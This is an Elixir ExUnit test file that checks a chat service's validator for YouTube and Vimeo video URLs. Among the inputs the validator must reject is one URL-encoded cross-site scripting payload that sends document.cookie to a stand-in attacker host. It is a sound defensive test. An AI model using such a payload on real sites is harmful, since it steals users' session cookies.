defmodule KlziiChat.Services.Validations.Resources do
  use ExUnit.Case, async: true
  alias KlziiChat.Services.Validations.Resource, as: ResourceValidations

  describe "video_service_url_validator" do
    test "video_service_url_validator" do
      valid_video_service_links = %{
        a: "http://www.youtube.com/watch?v=0zM3nApSvMg&feature=feedrec_grec_index",
        b: "http://www.youtube.com/user/IngridMichaelsonVEVO#p/a/u/1/QdK8U-VIH_o",
        c: "http://www.youtube.com/v/0zM3nApSvMg?fs=1&amp;hl=en_US&amp;rel=0",
        d: "http://www.youtube.com/watch?v=0zM3nApSvMg#t=0m10s",
        e: "http://www.youtube.com/embed/0zM3nApSvMg?rel=0",
        f: "http://www.youtube.com/watch?v=0zM3nApSvMg",
        g: "http://youtu.be/0zM3nApSvMg",
        h: "https://vimeo.com/193358188",
        i: "https://player.vimeo.com/video/193358188"
      }
      invalid_video_service_links = %{
        a: "http://www.welp.com/?search=%3Cscript%3Ewindow.location=%22http://www.haxxed.com?cookie=%22+document.cookie%3C/script%3E"
      }

      assert({:ok} = ResourceValidations.video_service_url_validator(valid_video_service_links.a))
      assert({:ok} = ResourceValidations.video_service_url_validator(valid_video_service_links.b))
      assert({:ok} = ResourceValidations.video_service_url_validator(valid_video_service_links.c))
      assert({:ok} = ResourceValidations.video_service_url_validator(valid_video_service_links.d))
      assert({:ok} = ResourceValidations.video_service_url_validator(valid_video_service_links.e))
      assert({:ok} = ResourceValidations.video_service_url_validator(valid_video_service_links.f))
      assert({:ok} = ResourceValidations.video_service_url_validator(valid_video_service_links.g))
      assert({:ok} = ResourceValidations.video_service_url_validator(valid_video_service_links.h))
      assert({:ok} = ResourceValidations.video_service_url_validator(valid_video_service_links.i))
      assert({:error, _} = ResourceValidations.video_service_url_validator(invalid_video_service_links.a))
    end
  end
end
